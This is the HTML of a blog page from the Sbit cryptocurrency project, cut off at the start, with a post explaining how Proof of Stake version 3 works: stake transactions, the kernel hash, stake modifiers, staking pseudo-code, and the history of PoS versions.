5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><p>P2P Network Port: 22001 (port forwarding is not required or recommended, but the wallet must be able to access other external nodes through this port to download the blockchain)</p></div></div></div></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="blogPostTitle_rzP5" itemprop="headline"><a itemprop="url" href="/sbit.dev/blog/pos">PoS in Sbit</a></h2><div class="blogPostData_Zg1s margin-vert--md"><time datetime="2022-04-27T15:25:34.000Z" itemprop="datePublished">April 27, 2022</time> · <!-- -->15 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><span itemprop="name">Sbit Dev Team</span></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p>In every cryptocurrency there must be some consensus mechanism which keeps the entire distributed network in sync. When Bitcoin first came out, it introduced the Proof of Work (PoW) system. PoW is done by cryptographically hashing a piece of data (the block header) over and over. Because of how one-way hashing works. One tiny change in the data can cause an extremely different hash to come of it. Participants in the network determine if the PoW is valid complete by judging if the final hash meets a certain condition, called difficulty. The difficulty is an ever changing &quot;target&quot; which the hash must meet or exceed. Whenever the network is creating more blocks than scheduled, this target is changed automatically by the network so that the target becomes more and more difficult to meet. And thus, requires more and more computing power to find a hash that matches the target within the target time of 10 minutes.</p><p>Definitions
Some basic definitions might be unfamiliar to some people not familiar with the blockchain code, these are:</p><p>UTXO - Unspent Transaction Output
vin - In a transaction a &#x27;vin&#x27; is a UTXO that is being spent as an &quot;input&quot;
vout - In a transaction, a &#x27;vout&#x27; is the new UTXO that is being created as an &quot;output&quot;. The &#x27;vouts&#x27; is effectively all of the coins sent after the transaction is complete
hashing - The process of creating a hash. This takes an arbritrary amount of data as input, and outputs a fixed size &quot;digest&quot; which is impossible to reverse. Additionally, if you change anything about the input data, it drastically changes the output digest.
hash - The result of a hashing algorithm.
script - The computer program that determines how a vout/UTXO is spent.
pay-to-pubkeyhash script - The most common script used to send money in Bitcoin and other cryptocurrencies. In order to send money, all you need to know is the hash of their public key (commonly represented as a base58 address), and in order to spend the received money all that is needed is a signature from the public key, and the public key itself.
pay-to-pubkey script - A very simple script which has very similar functionality to pubkeyhash scripts. However, instead of sending money to the hash of a public key, the money is sent to the public key itself. All that is needed for spending is a cryptographic signature proving ownership of the public key.
prevout - The vout which is spent (as a vin) in a transaction
OP_RETURN script - OP_RETURN is an operation used in script which effectively makes an output provably unspendable. It is commonly used to hold small amounts of data on the blockchain without polluting the UTXO set.
Proof of Work and Blockchain Consensus Systems
Proof of Work is a proven consensus mechanism that has made Bitcoin secure and trustworthy for 8 years now. However, it is not without it&#x27;s fair share of problems. PoW&#x27;s major drawbacks are:</p><p>PoW wastes a lot of electricity, harming the environment.
PoW benefits greatly from economies of scale, so it tends to benefit big players the most, rather than small participants in the network.
PoW provides no incentive to use or keep the tokens.
PoW has some centralization risks, because it tends to encourage miners to participate in the biggest mining pool (a group of miners who share the block reward), thus the biggest mining pool operator holds a lot of control over the network.
Proof of Stake was invented to solve many of these problems by allowing participants to create and mine new blocks (and thus also get a block reward), simply by holding onto coins in their wallet and allowing their wallet to do automatic &quot;staking&quot;. Proof Of Stake was originally invented by Sunny King and implemented in Peercoin. It has since been improved and adapted by many other people. This includes &quot;Proof of Stake Version 2&quot; by Pavel Vasin, &quot;Proof of Stake Velocity&quot; by Larry Ren, and most recently CASPER by Vlad Zamfir, as well as countless other experiments and lesser known projects.</p><p>For Sbit we have decided to build upon &quot;Proof of Stake Version 3&quot;, an improvement over version 2 that was also made by Pavel Vasin and implemented in the Blackcoin project. This version of PoS as implemented in Blackcoin is what we will be describing here. Some minor details of it has been modified in Sbit, but the core consensus model is identical.</p><p>For many community members and developers alike, proof of stake is a difficult topic, because there has been very little written on how it manages to accomplish keeping the network safe using only proof of ownership of tokens on the network. This blog post will go into fine detail about Proof of Stake Version 3 and how it&#x27;s blocks are created, validated, and ultimately how a pure Proof of Stake blockchain is possible to secure. This will assume some technical knowledge, but I will try to explain things so that most of the knowledge can be gathered from context. You should at least be familiar with the concept of the UTXO-based blockchain.</p><p>Before we talk about PoS, it helps to understand how the much simpler PoW consensus mechanism works. It&#x27;s mining process can be described in just a few lines of pseudo-code:</p><p>while(blockhash &gt; difficulty) {
block.nonce = block.nonce + 1
blockhash = sha256(sha256(block))
}
A hash is a cryptographic algorithm which takes an arbritrary amount of input data, does a lot of processing of it, and outputs a fixed-size &quot;digest&quot; of that data. It is impossible to figure out the input data with just the digest. So, PoW tends to function like a lottery, where you find out if you won by creating the hash and checking it against the target, and you create another ticket by changing some piece of data in the block. In Bitcoin&#x27;s case, nonce is used for this, as well as some other fields (usually called &quot;extraNonce&quot;). Once a blockhash is found which is less than the difficulty target, the block is valid, and can be broadcast to the rest of the distributed network. Miners will then see it and start building the next block on top of this block.</p><p>Proof of Stake&#x27;s Protocol Structures and Rules
Now enter Proof of Stake. We have these goals for PoS:</p><p>Impossible to counterfeit a block
Big players do not get disproportionally bigger rewards
More computing power is not useful for creating blocks
No one member of the network can control the entire blockchain
The core concept of PoS is very similar to PoW, a lottery. However, the big difference is that it is not possible to &quot;get more tickets&quot; to the lottery by simply changing some data in the block. Instead of the &quot;block hash&quot; being the lottery ticket to judge against a target, PoS invents the notion of a &quot;kernel hash&quot;.</p><p>The kernel hash is composed of several pieces of data that are not readily modifiable in the current block. And so, because the miners do not have an easy way to modify the kernel hash, they can not simply iterate through a large amount of hashes like in PoW.</p><p>Proof of Stake blocks add many additional consensus rules in order to realize it&#x27;s goals. First, unlike in PoW, the coinbase transaction (the first transaction in the block) must be empty and reward 0 tokens. Instead, to reward stakers, there is a special &quot;stake transaction&quot; which must be the 2nd transaction in the block. A stake transaction is defined as any transaction that:</p><p>Has at least 1 valid vin
It&#x27;s first vout must be an empty script
It&#x27;s second vout must not be empty
Furthermore, staking transactions must abide by these rules to be valid in a block:</p><p>The second vout must be either a pubkey (not pubkeyhash!) script, or an OP_RETURN script that is unspendable (data-only) but stores data for a public key
The timestamp in the transaction must be equal to the block timestamp
the total output value of a stake transaction must be less than or equal to the total inputs plus the PoS block reward plus the block&#x27;s total transaction fees. output &lt;= (input + block_reward + tx_fees)
The first spent vin&#x27;s output must be confirmed by at least 500 blocks (in otherwords, the coins being spent must be at least 500 blocks old)
Though more vins can used and spent in a staking transaction, the first vin is the only one used for consensus parameters.
These rules ensure that the stake transaction is easy to identify, and ensures that it gives enough info to the blockchain to validate the block. The empty vout method is not the only way staking transactions could have been identified, but this was the original design from Sunny King and has worked well enough.</p><p>Now that we understand what a staking transaction is, and what rules they must abide by, the next piece is to cover the rules for PoS blocks:</p><p>Must have exactly 1 staking transaction
The staking transaction must be the second transaction in the block
The coinbase transaction must have 0 output value and a single empty vout
The block timestamp must have it&#x27;s bottom 4 bits set to 0 (referred to as a &quot;mask&quot; in the source code). This effectively means the blocktime can only be represented in 16 second intervals, decreasing it&#x27;s granularity
The version of the block must be 7
A block&#x27;s &quot;kernel hash&quot; must meet the weighted difficulty for PoS
The block hash must be signed by the public key in the staking transaction&#x27;s second vout. The signature data is placed in the block (but is not included in the formal block hash)
The signature stored in the block must be &quot;LowS&quot;, which means consisting only of a single piece of data and must be as compressed as possible (no extra leading 0s in the data, or other opcodes)
Most other rules for standard PoW blocks apply (valid merkle hash, valid transactions, timestamp is within time drift allowance, etc)
There are a lot of details here that we&#x27;ll cover in a bit. The most important part that really makes PoS effective lies in the &quot;kernel hash&quot;. The kernel hash is used similar to PoW (if hash meets difficulty, then block is valid). However, the kernel hash is not directly modifiable in the context of the current block. We will first cover exactly what goes into these structures and mechanisms, and later explain why this design is exactly this way, and what unexpected consequences can come from minor changes to it.</p><p>The Proof of Stake Kernel Hash
The kernel hash specifically consists of the following exact pieces of data (in order):</p><p>Previous block&#x27;s &quot;stake modifier&quot; (more detail on this later)
Timestamp from &quot;prevout&quot; transaction (the transaction output that is spent by the first vin of the staking transaction)
The hash of the prevout transaction
The output number of the prevout (ie, which output of the transaction is spent by the staking transaction)
Current block time, with the bottom 4 bits set to 0 to reduce granularity. This is the only thing that changes during staking process
The stake modifier of a block is a hash of exactly:</p><p>The hash of the prevout transaction in PoS blocks, OR the block hash in PoW blocks.
The previous block&#x27;s stake modifier (the genesis block&#x27;s stake modifier is 0)
The only way to change the current kernel hash (in order to mine a block), is thus to either change your &quot;prevout&quot;, or to change the current block time.</p><p>A single wallet typically contains many UTXOs. The balance of the wallet is basically the total amount of all the UTXOs that can be spent by the wallet. This is of course the same in a PoS wallet. This is important though, because any output can be used for staking. One of these outputs are what can become the &quot;prevout&quot; in a staking transaction to form a valid PoS block.</p><p>Finally, there is one more aspect that is changed in the mining process of a PoS block. The difficulty is weighted against the number of coins in the staking transaction. The PoS difficulty ends up being twice as easy to achieve when staking 2 coins, compared to staking just 1 coin. If this were not the case, then it would encourage creating many tiny UTXOs for staking, which would bloat the size of the blockchain and ultimately cause the entire network to require more resources to maintain, as well as potentially compromise the blockchain&#x27;s overall security.</p><p>So, if we were to show some pseudo-code for finding a valid kernel hash now, it would look like:</p><div class="language-cpp codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-cpp codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token keyword" style="color:rgb(86, 156, 214)">while</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token boolean">true</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">foreach</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">utxo in wallet</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        blockTime </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> currentTime </span><span class="token operator" style="color:rgb(212, 212, 212)">-</span><span class="token plain"> currentTime </span><span class="token operator" style="color:rgb(212, 212, 212)">%</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">16</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        posDifficulty </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> difficulty </span><span class="token operator" style="color:rgb(212, 212, 212)">*</span><span class="token plain"> utxo</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain">value</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        hash </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">hash</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">previousStakeModifier </span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;&lt;</span><span class="token plain"> utxo</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain">time </span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;&lt;</span><span class="token plain"> utxo</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain">hash </span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;&lt;</span><span class="token plain"> utxo</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain">n </span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;&lt;</span><span class="token plain"> blockTime</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        </span><span class="token keyword" style="color:rgb(86, 156, 214)">if</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">hash </span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token plain"> posDifficulty</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            done</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    wait </span><span class="token number" style="color:rgb(181, 206, 168)">16</span><span class="token plain">s </span><span class="token operator" style="color:rgb(212, 212, 212)">--</span><span class="token plain"> wait </span><span class="token number" style="color:rgb(181, 206, 168)">16</span><span class="token plain"> seconds</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> until the block time can be changed</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This code isn&#x27;t so easy to understand as our PoW example, so I&#x27;ll attempt to explain it in plain english:</p><p>Do the following over and over for infinity:
Calculate the blockTime to be the current time minus itself modulus 16 (modulus is like dividing by 16, but then only instead of taking the result, taking the remainder)
Calculate the posDifficulty as the network difficulty, multiplied by the number of coins held by the UTXO.
Cycle through each UTXO in the wallet. With each UTXO, calculate a SHA256 hash using the previous block&#x27;s stake modifier, as well as some data from the the UTXO, and finally the blockTime. Compare this hash to the posDifficulty. If the hash is less than the posDifficulty, then the kernel hash is valid and you can create a new block.
After going through all UTXOs, if no hash produced is less than the posDifficulty, then wait 16 seconds and do it all over again.
Now that we have found a valid kernel hash using one of the UTXOs we can spend, we can create a staking transaction. This staking transaction will have 1 vin, which spends the UTXO we found that has a valid kernel hash. It will have (at least) 2 vouts. The first vout will be empty, identifying to the blockchain that it is a staking transaction. The second vout will either contain an OP_RETURN data transaction that contains a single public key, or it will contain a pay-to-pubkey script. The latter is usually used for simplicity, but using a data transaction for this allows for some advanced use cases (such as a separate block signing machine) without needlessly cluttering the UTXO set.</p><p>Finally, any transactions from the mempool are added to the block. The only thing left to do now is to create a signature, proving that we have approved the otherwise valid PoS block. The signature must use the public key that is encoded (either as pay-pubkey script, or as a data OP_RETURN script) in the second vout of the staking transaction. The actual data signed in the block hash. After the signature is applied, the block can be broadcast to the network. Nodes in the network will then validate the block and if it finds it valid and there is no better blockchain then it will accept it into it&#x27;s own blockchain and broadcast the block to all the nodes it has connection to.</p><p>Now we have a fully functional and secure PoSv3 blockchain. PoSv3 is what we determined to be most resistant to attack while maintaining a pure decentralized consensus system (ie, without master nodes or currators). To understand why we approached this conclusion however, we must understand it&#x27;s history.</p><p>PoSv3&#x27;s History
Proof of Stake has a fairly long history. I won&#x27;t cover every detail, but cover broadly what was changed between each version to arrive at PoSv3 for historical purposes:</p><p>PoSv1 - This version is implemented in Peercoin. It relied heavily on the notion of &quot;coin age&quot;, or how long a UTXO has not been spent on the blockchain. It&#x27;s implementation would basically make it so that the higher the coin age, the more the difficulty is reduced. This had the bad side-effect however of encouraging people to only open their wallet every month or longer for staking. Assuming the coins were all relatively old, they would almost instantaneously produce new staking blocks. This however makes double-spend attacks extremely easy to execute. Peercoin itself is not affected by this because it is a hybrid PoW and PoS blockchain, so the PoW blocks mitigated this effect.</p><p>PoSv2 - This version removes coin age completely from consensus, as well as using a completely different stake modifier mechanism from v1. The number of changes are too numerous to list here. All of this was done to remove coin age from consensus and make it a safe consensus mechanism without requiring a PoW/PoS hybrid blockchain to mitigate various attacks.</p><p>PoSv3 - PoSv3 is really more of an incremental improvement over PoSv2. In PoSv2 the stake modifier also included the previous block time. This was removed to prevent a &quot;short-range&quot; attack where it was possible to iteratively mine an alternative blockchain by iterating through previous block times. PoSv2 used block and transaction times to determine the age of a UTXO; this is not the same as coin age, but rather is the &quot;minimum confirmations required&quot; before a UTXO can be used for staking. This was changed to a much simpler mechanism where the age of a UTXO is determined by it&#x27;s depth in the blockchain. This thus doesn&#x27;t incentivize inaccurate timestamps to be used on the blockchain, and is also more immune to &quot;timewarp&quot; attacks. PoSv3 also added support for OP_RETURN coinstake transactions which allows for a vout to contain the public key for signing the block without requiring a full pay-to-pubkey script.</p></div></article><nav class="pagination-nav" aria-label="Blog list page navigation"></nav></main></div></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Get in touch</div><ul class="footer__items clean-list"><li class="footer__item"><a href="mailto: dev@sbit.dev" target="_blank" rel="noopener noreferrer" class="footer__link-item">Contact<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/docs/welcome">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/SBit-Project/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2022 - Sbit Project</div></div></div></footer></div>
<script src="/sbit.dev/assets/js/runtime~main.67390360.js"></script>
<script src="/sbit.dev/assets/js/main.cb492e30.js"></script>
</body>
</html>